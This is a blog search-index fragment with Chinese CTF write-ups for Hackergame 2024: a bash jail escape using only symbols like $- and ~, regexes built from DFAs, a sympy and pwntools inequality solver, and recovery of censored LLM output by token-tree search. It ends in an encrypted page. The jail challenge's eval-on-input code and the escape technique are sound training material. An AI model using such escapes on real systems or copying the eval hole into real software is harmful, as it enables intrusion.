167 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f Abstract \u8fd9\u5df2\u7ecf\u662f\u53bb\u5e74\u7684\u8d5b\u4e8b\u4e86\uff0c\u8bb0\u5f97\u662fZJUCTF2024\u540e\u7684\u8d81\u70ed\u6253\u94c1\uff0c\u5230\u4e862025\u5e74\u4e86\u624d\u6765\u66f4\u4e00\u4e0bxs\u3002\u4e0d\u8fc7\u611f\u89c9\u4ee5\u540e\u8d8a\u6765\u8d8a\u5fd9\u5e94\u8be5\u4e5f\u6ca1\u4ec0\u4e48\u65f6\u95f4\u5927\u6253\u4e86\uff0c\u5584\u59cb\u5584\u7ec8\u5427\uff0c\u4f46\u662f\u56e0\u4e3a\u592a\u4e45\u8fdc\u4e86\uff0c\u6240\u4ee5\u5c31\u6311\u51e0\u9053\u5370\u8c61\u6df1\u523b\u7684\u5199\u4e00\u5199 \u5b98\u65b9\u9898\u89e3\uff1a Hackergame 2024","title":"Hackergame 2024"},{"location":"writeups/hackergame2024/#_1","text":"\u6ca1\u60f3\u5230\u771f\u6709\u4eba\u628aflag\u85cf\u8bba\u6587\u4e2d\u54c8\u54c8\u54c8\u54c8\uff0c\u9898\u76ee\u5f88\u7b80\u5355\u641c\u4e00\u4e0bflag\uff0c\u7136\u540e\u79fb\u52a8\u4e00\u4e0b\u5143\u7d20\u5c31\u80fd\u770b\u5230\u3002 \u8bba\u6587\u94fe\u63a5","title":"\u6bcf\u65e5\u8bba\u6587\u592a\u591a\u4e86"},{"location":"writeups/hackergame2024/#powerfulshell","text":"\u9898\u76ee\u903b\u8f91 #!/bin/bash FORBIDDEN_CHARS = \"'\\\";,.%^*?!@#%^&()><\\/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0\" PowerfulShell () { while true ; do echo -n 'PowerfulShell@hackergame> ' if ! read input ; then echo \"EOF detected, exiting...\" break fi if [[ $input = ~ [ $FORBIDDEN_CHARS ] ]] ; then echo \"Not Powerful Enough :)\" exit else eval $input fi done } PowerfulShell \u6838\u5fc3\u601d\u8def\u5c31\u662f\u5229\u7528\u4ec5\u5269\u7684 $-_~{}1-9: \u6765\u6784\u9020Payload\uff0c\u6839\u636e\u5df2\u77e5\uff0c\u6211\u4eec\u6613\u5f97 ~ \u53ef\u4ee5\u83b7\u53d6 $HOME \uff0c\u5373 /player \uff0c\u800c $- \u662f hB \uff0c\u90a3\u4e48\u6211\u4eec\u8f7b\u800c\u6613\u4e3e\u7684\u5c31\u80fd\u6784\u9020\u51fa\u5f88\u591a\u5e38\u89c1\u7684\u547d\u4ee4\uff0c\u6bd4\u5982 ls \uff0c cat \u7b49\u7b49\uff0c\u7136\u540e\u5c31\u80fd\u62ff\u5230flag\u4e86\u3002","title":"PowerfulShell"},{"location":"writeups/hackergame2024/#_2","text":"\u5f88\u6709\u610f\u601d\u7684\u4e00\u9898\uff0c\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u5b9e\u73b0\u6570\u5b57\u662f\u5426\u6574\u9664\uff0c\u751a\u81f3CRC\u6821\u9a8c\uff0c\u56e0\u4e3a\u4e0d\u662f\u7b97\u6cd5\u51fa\u8eab\uff0c\u8fd8\u662f\u7b2c\u4e00\u6b21\u4e86\u89e3\u5230\uff0c\u5b66\u4e60\u4e86\u3002 \u9898\u76ee\u4ee3\u7801 import re import random # pip install libscrc import libscrc allowed_chars = \"0123456789()|*\" max_len = 1000000 num_tests = 300 difficulty = int ( input ( \"Enter difficulty level (1~3): \" )) if difficulty not in [ 1 , 2 , 3 ]: raise ValueError ( \"Invalid difficulty level\" ) regex_string = input ( \"Enter your regex: \" ) . strip () if len ( regex_string ) > max_len : raise ValueError ( \"Regex string too long\" ) if not all ( c in allowed_chars for c in regex_string ): raise ValueError ( \"Invalid character in regex string\" ) regex = re . compile ( regex_string ) for i in range ( num_tests ): expected_result = ( i % 2 == 0 ) while True : t = random . randint ( 0 , 2 ** 64 ) # random number for testing if difficulty == 1 : test_string = str ( t ) # decimal if ( t % 16 == 0 ) == expected_result : # mod 16 break elif difficulty == 2 : test_string = bin ( t )[ 2 :] # binary if ( t % 13 == 0 ) == expected_result : # mod 13 break elif difficulty == 3 : test_string = str ( t ) # decimal if ( libscrc . gsm3 ( test_string . encode ()) == 0 ) == expected_result : # crc break else : raise ValueError ( \"Invalid difficulty level\" ) regex_result = bool ( regex . fullmatch ( test_string )) if regex_result == expected_result : print ( \"Pass\" , test_string , regex_result , expected_result ) else : print ( \"Fail\" , test_string , regex_result , expected_result ) raise RuntimeError ( \"Failed\" ) print ( open ( f \"flag { difficulty } \" ) . read ()) \u7b2c\u4e00\u95ee\u975e\u5e38\u7b80\u5355\uff0c\u5341\u8fdb\u5236\u6570\u662f\u5426\u662f16\u7684\u500d\u6570\uff0c\u8fd9\u4e2a\u89c4\u5f8b\u5f88\u597d\u627e\uff0c\u4e5f\u5f88\u597d\u5199\uff0c\u6240\u4ee5\u5c31\u4e0d\u591a\u8d58\u8ff0\u4e86\u3002 \u7b2c\u4e8c\u95ee\u662f\u4e8c\u8fdb\u5236\u6570\u662f\u5426\u662f13\u7684\u500d\u6570\uff0c\u8fd9\u4e2a\u5c31\u6709\u70b9\u96be\u5ea6\u4e86\uff0c\u56e0\u4e3a\u4e8c\u8fdb\u5236\u6570\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4e0d\u662f\u90a3\u4e48\u597d\u5199\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u6709\u9650\u72b6\u6001\u81ea\u52a8\u673a\uff08DFA\uff09\u6765\u5224\u65ad\u3002 \u6784\u9020\u65b9\u6cd5\uff1aDFA \u7684\u72b6\u6001\u4ee3\u8868\u4f59\u6570\uff08\u6709 0~12 \u4e00\u5171 13 \u4e2a\u72b6\u6001\uff09\uff0c\u521d\u59cb\u72b6\u6001\u662f 0\uff0c\u6bcf\u6b21\u8bfb\u5165\u4e00\u4e2a bit \u66f4\u65b0\u4f59\u6570\uff08\u72b6\u6001\u8f6c\u79fb\uff09\uff08 s:=(s*2+b)%13 \uff09\uff0c\u8bfb\u5165\u5b8c\u6bd5\u540e\u5982\u679c DFA \u5904\u4e8e 0 \u72b6\u6001\uff08\u4f59\u6570\u4e3a 0\uff09\uff0c\u5c31\u610f\u5473\u7740\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6570\u6574\u9664 13\u3002 \u7136\u540e\u53ef\u4ee5\u4f7f\u7528 \u72b6\u6001\u6d88\u9664\u7b97\u6cd5 \uff0c\u5c06 DFA \u8f6c\u5316\u4e3a\u6b63\u5219\u8868\u8fbe\u5f0f\u3002 \u7b2c\u4e09\u95ee\u4e5f\u662f\u7c7b\u4f3c\u7684\u65b9\u6cd5\u53ef\u89e3\uff0c\u8fd9\u6b21 DFA \u7684\u72b6\u6001\u662f\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff08LFSR\uff09\u7684\u72b6\u6001\uff0c\u5bc4\u5b58\u5668\u6709 3 \u4f4d\uff0c\u4e00\u5171\u662f 8 \u79cd\u72b6\u6001\uff08000~111\uff09\uff0cDFA \u521d\u59cb\u72b6\u6001\u662f 111\uff0c\u6bcf\u6b21\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u66f4\u65b0\u72b6\u6001\uff0c\u8bfb\u5165\u5b8c\u6bd5\u540e\u5982\u679c DFA \u5904\u4e8e 000 \u72b6\u6001\uff0c\u5c31\u610f\u5473\u7740\u8fd9\u4e2a\u5b57\u7b26\u4e32\u7b26\u5408\u8981\u6c42\u3002 \u9898\u89e3 # pip install greenery # pip install regex from greenery import Fsm , Charclass , rxelems import regex as re import random m = 13 d = 2 digits = [ Charclass ( str ( i )) for i in range ( d )] other = ~ Charclass ( \"\" . join ( str ( i ) for i in range ( d ))) alphabet = set ( digits + [ other ]) states = set ( range ( m + 1 )) # m is the dead state initial_state = 0 accepting_states = { 0 } transition_map = dict () for s in range ( m ): transition_map [ s ] = { digits [ i ]: ( s * d + i ) % m for i in range ( d )} transition_map [ s ][ other ] = m transition_map [ m ] = { digits [ i ]: m for i in range ( d )} transition_map [ m ][ other ] = m dfa = Fsm ( alphabet = alphabet , states = states , initial = initial_state , finals = accepting_states , map = transition_map , ) def convert_regex ( regex ): # `(...)?` -> `((...)|)` while '?' in regex : regex = re . sub ( r '\\((.*?)\\)\\?' , r '(\\1|)' , regex ) # Handle `{n}` quantifier n = 1 while '{' in regex : while '{' + str ( n ) + '}' in regex : regex = re . sub ( r '(\\((.*?)\\)|\\w)\\{n\\}' . replace ( 'n' , str ( n )), r '\\1' * n , regex ) n += 1 # [abc] -> (a|b|c) while '[' in regex : def convert_charset ( match ): chars = match . group ( 1 ) return '(' + '|' . join ( chars ) + ')' regex = re . sub ( r '\\[([^\\]]+)\\]' , convert_charset , regex ) assert set ( regex ) <= set ( \"0123456789|()*\" ) return regex dfa = dfa . reduce () regex = rxelems . from_fsm ( dfa ) regex = regex . reduce () regex = convert_regex ( str ( regex )) print ( regex ) \u8fd9\u91cc\u5c31\u8d34\u4e00\u4e0b\u5b98\u65b9\u9898\u89e3\u5566:)","title":"\u5f3a\u5927\u7684\u6b63\u5219\u8868\u8fbe\u5f0f"},{"location":"writeups/hackergame2024/#_3","text":"\u7531\u4e8e\u6211\u4eec\u6ce8\u610f\u529b\u60ca\u4eba\uff0c\u6ce8\u610f\u5230\u8fd9\u7bc7 \u77e5\u4e4e\u6587\u7ae0 \uff0c\u5176\u4e2d\u7b2c\u4e00\u79cd\u7c7b\u578b\u5c31\u662f\u8bc1\u660e \\(\\pi\\) \u5927\u4e8e\u4e00\u4e2a\u6709\u7406\u6570\u3002 \u6211\u4eec\u4f7f\u7528\u5982\u4e0b\u5b9a\u79ef\u5206\uff1a \\(\\int_0^1 \\frac{x^n(1-x)^n(a+bx+cx^2)}{1+x^2} dx\\) \u6839\u636e\u4e0d\u540c\u7684 n \uff0c\u8d8a\u5927\u4e0d\u7b49\u5f0f\u8d8a\u7d27\uff0c\u6240\u4ee5\u53ea\u8981\u7ed9\u5b9a\u4e00\u4e2a n \uff0c\u7136\u540e\u6c42\u89e3 a,b,c \u5373\u53ef\u3002\u4f7f\u7528python\u7684sympy\u5c31\u80fd\u89e3\u7b54\u3002 \u89e3\u9898\u4ee3\u7801 from pwn import * import sympy N = 100 x , a , b , c = sympy . symbols ( 'x a b c' ) f = ( x ** N * ( 1 - x ) ** N * ( a + b * x + c * x ** 2 )) / ( 1 + x ** 2 ) inv = sympy . integrate ( f , ( x , 0 , 1 )) inv = sympy . simplify ( inv ) # inv = sympy.collect(inv, [\"log(2)\", \"pi\"]) l2 = inv . coeff ( \"log(2)\" ) pic = inv . coeff ( \"pi\" ) left = sympy . simplify ( inv - l2 * sympy . log ( 2 ) - pic * sympy . pi ) def get_exp ( p , q ): expr = [ l2 , pic - q , left + p ] r3 = sympy . solve ( expr , [ a , b , c ]) r3 = zip ([ a , b , c ], r3 . values ()) return f . subs ( r3 ) / q pp = remote ( 'ip' , port ) pp . recvuntil ( b 'Please input your token:' ) pp . sendline ( b 'your_token' ) def solve (): que = pp . recvline_contains ( b \"Please prove that \" ) que = que . decode () . split ( \" \" )[ - 1 ][ 4 :] pp . recvuntil ( b 'Enter the function f(x):' ) if len ( que ) == 1 : ans = b '4*((1-x**2)**(1/2)-(1-x))' else : p , q = map ( int , que . split ( '/' )) ans = str ( get_exp ( p , q )) . encode () pp . sendline ( ans ) pp . recvuntil ( b 'Q.E.D.' ) for i in range ( 40 ): solve () print ( f '[ { i + 1 } /40] PASS' ) pp . interactive ()","title":"\u4f18\u96c5\u7684\u4e0d\u7b49\u5f0f"},{"location":"writeups/hackergame2024/#_4","text":"\u8fd9\u9053\u9898\u5f88\u6709\u610f\u601d\uff0c\u4e0d\u80fd\u590d\u5236\u7c98\u8d34\u4ea4\u4e92\u7684novnc\uff0c\u540c\u65f6\u8fd8\u6709\u4e22\u5305\uff08sad \u6211\u7528\u7684\u662f\u7b28\u529e\u6cd5\uff0c\u83b7\u53d6\u5185\u5bb9\u7136\u540eocr\uff0c\u4e3a\u4e86\u964d\u4f4eocr\u96be\u5ea6\uff0c\u6211\u7528\u4e86\u4e8c\u8fdb\u5236\u7684\u65b9\u5f0f\uff0c\u5bfc\u81f4\u7ed3\u679c\u5f88\u591a\uff0c\u8fd8\u6709\u4e22\u5305\uff0c\u624b\u52a8\u6821\u6b63\u4e86\u4e00\u4e0b\uff08\u6211\u597d\u83dcqaq \u770b\u4e86\u9898\u89e3\u53d1\u73b0\u53ef\u4ee5\u7528\u7070\u5ea6\u7f16\u7801\u7684\u65b9\u6cd5\uff0c\u5269\u4e0b\u7684\u5c31\u662f\u81ea\u52a8\u5316\u590d\u5236\u4ee3\u7801\u5230vnc\u4e86\uff0c\u8fd9\u4e2a\u5f88\u7b80\u5355\uff0c\u5c31\u4e0d\u591a\u8bf4\u4e86\u3002 \u5176\u5b9e\u987a\u7740\u9898\u89e3\u7684\u601d\u8def\uff0c\u53ef\u4ee5\u8bd5\u8bd5\u4e8c\u7ef4\u7801\uff0c\u4e0d\u8fc7\u6211\u6ca1\u4e8b\uff08\u7b11","title":"\u65e0\u6cd5\u83b7\u5f97\u7684\u79d8\u5bc6"},{"location":"writeups/hackergame2024/#_5","text":"\u8fd9\u9898\u4e3b\u8981\u5b66\u4e60\u4e00\u4e0b\u96f6\u77e5\u8bc6\u8bc1\u660e\u7684\u7406\u8bba\u548c\u903b\u8f91\uff0c\u4ee5\u53ca\u76f8\u5173circom\u5de5\u5177\uff0c\u4e0d\u8fc7\u6ca1\u6709\u6df1\u5165\u4e86\u89e3\uff0c\u4ec5\u4f5c\u8bb0\u5f55 Ref\uff1a zk-bug-tracker \uff0c 1. Missing Bit Length Check \uff0c 14. Assigned but not Constrained \uff0c Circom \u3002","title":"\u96f6\u77e5\u8bc6\u6570\u72ec"},{"location":"writeups/hackergame2024/#llm-hackergame","text":"\u53c8\u662f\u4e00\u9053\u5927\u6a21\u578b\u9006\u5411\u9898\uff0c \u9996\u5148\u6211\u4eec\u8981\u7406\u89e3\uff08\u4e3b\u6d41\u7684\uff09LLM \u7684\u5de5\u4f5c\u539f\u7406\uff0c\u7b80\u5355\u6765\u770b\u5355\u6b21\u7684 inference \u8fc7\u7a0b\u5c31\u662f\u628a prompt \u7f16\u7801\u6210\u4e00\u4e2a\u77e9\u9635\uff0c\u7ecf\u8fc7\u5999\u5999\u8fd0\u7b97\u5f97\u5230\u4e00\u4e2a\u957f\u5ea6\u4e3a\u8bcd\u8868\u5927\u5c0f\u7684\u5411\u91cf\uff0c\u7136\u540e\u518d\u4ece\u8fd9\u4e2a\u5411\u91cf sampling \u51fa\u4e00\u4e2a token\u3002\u770b\u4e00\u770b\u4ee3\u7801\u5c31\u80fd\u53d1\u73b0\uff0c\u9898\u76ee\u91cc\u7528\u5230\u7684 llama-cpp-python \u7684\u9ed8\u8ba4\u4f7f\u7528\u4e86 top-p\u3001top-k \u7b49 sampler\u3002\u6211\u4eec\u5176\u5b9e\u4e0d\u9700\u8981\u5173\u5fc3\u5177\u4f53\u7ec6\u8282\uff0c\u53ea\u9700\u8981\u628a\u4ed6\u4eec\u7406\u89e3\u6210\u4e00\u4e2a\u66f4\u6539\u5404\u4e2a token \u51fa\u73b0\u7684\u6982\u7387\u7684\u5411\u91cf\u51fd\u6570\u5373\u53ef\u3002\u6211\u4eec\u53ef\u4ee5\u539f\u6837\u63a8\u7406\u4e00\u6b21\uff0c\u628a\u4e0d\u7b26\u5408\u8bed\u6cd5\u7684 token\uff08\u6bd4\u5982\u5f53\u524d\u4f4d\u7f6e\u4e4b\u540e\u7684\u5b57\u7b26\u662f xxxxxp...\uff0c\u90a3\u4e48 hello \u80af\u5b9a\u4e0d\u7b26\u5408\u8bed\u6cd5\uff0c\u56e0\u4e3a l \u4e0d\u4f1a\u53d8\u6210 x\uff0c\u800c hack \u5219\u7b26\u5408\u8bed\u6cd5\uff0c\u56e0\u4e3a\u524d\u56db\u4e2a\u5b57\u6bcd\u90fd\u662f x\uff09\u7684\u51fa\u73b0\u6982\u7387\u8bbe\u6210 0\uff0c\u5269\u4e0b\u7684\u5c31\u662f\u8fd9\u4e2a\u4f4d\u7f6e\u53ef\u80fd\u7684 token\u3002\u5982\u6b64\u8fd9\u822c\uff0c\u6bcf\u4e00\u4e2a\u53ef\u80fd\u7684 token \u90fd\u662f\u4e00\u4e2a\u9009\u62e9\u7684\u5206\u652f\uff0c\u6211\u4eec\u76f8\u5f53\u4e8e\u8fdb\u5165\u4e86\u4e00\u4e2a\u641c\u7d22\u6811\uff08\u7c7b\u4f3c\u4e8e\u8ff7\u5bab\uff09\uff0c\u8fd9\u4e2a\u6811\u53ef\u80fd\u53ea\u6709\u4e00\u4e2a\u80fd\u8fbe\u5230 EOG\uff08\u8fd9\u91cc\u662f <|im_end|>\uff09\u7684\u53f6\u5b50\u8282\u70b9\uff08\u6bd4\u5982\u7b2c\u4e00\u95ee\uff09\uff0c\u4e5f\u53ef\u80fd\u6709\u5f88\u591a\u8fbe\u5230 EOG \u7684\u53f6\u5b50\u8282\u70b9\uff08\u6bd4\u5982\u7b2c\u4e8c\u95ee\uff09\uff0c\u800c\u6b63\u786e\u6ee1\u8db3 hash \u7684\u7b54\u6848\u5c31\u5728\u67d0\u4e2a\u53f6\u5b50\u8282\u70b9\u4e2d\u3002 \u89e3\u9898\u601d\u8def \u89e3\u9898\u4ee3\u7801\u662f\u57fa\u4e8e llama.cpp \u6539\u7684\uff0cdiff \u88ab\u5bfc\u51fa\u6210\u4e86 exp.patch \u6587\u4ef6\uff0c\u9009\u624b\u60f3\u81ea\u5df1\u8fd0\u884c\u7684\u8bdd\u65b9\u6cd5\u5927\u81f4\u5982\u4e0b\uff1a clone https://github.com/ggerganov/llama.cpp/ checkout c421ac072d46172ab18924e1e8be53680b54ed3b apply exp.patch modify examples/simple/simple.cpp L23 for censored chars modify examples/simple/simple.cpp L178 for prompt modify examples/simple/simple.cpp L202 for number of threads make (optional with GGML_CUDA=1) copy after.txt & before.sha256 to current dir ./llama-simple -m /path/to/qwen2.5-3b-instruct-q8_0.gguf echo \"flag{llm_lm_lm_koshitantan_$(sha512sum output.txt | cut -d ' ' -f1 | cut -c1-16)}\"","title":"\u5148\u4e0d\u8bf4\u5173\u4e8e\u6211\u4ece\u96f6\u5f00\u59cb\u72ec\u81ea\u5728\u5f02\u4e16\u754c\u8f6c\u751f\u6210\u67d0\u5927\u5382\u5bb6\u7684 LLM \u9f99\u732b\u5973\u4ec6\u8fd9\u4ef6\u4e8b\u53ef\u4e0d\u53ef\u80fd\u8fd9\u4e48\u79bb\u8c31\uff0c\u53d1\u73b0 Hackergame \u5185\u5bb9\u5ba1\u67e5\u59d4\u5458\u4f1a\u5fd8\u8bb0\u5ba1\u67e5\u9898\u76ee\u6807\u9898\u4e86\u3054\u3081\u3093\u306d\uff0c\u4ee5\u53ca\u300c\u8fd9\u4e48\u957f\u90fd\u5feb\u8d76\u4e0a\u8f7b\u5c0f\u8bf4\u4e86\u771f\u7684\u4e0d\u4f1a\u5f71\u54cd\u7528\u6237\u4f53\u9a8c\u5417\ud83e\udd23\u300d"},{"location":"writeups/zjuctf2023/","text":"02xV83XL97fOCwDIG2W9KA==;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;^","title":"\ud83d\udd12 ZJUCTF 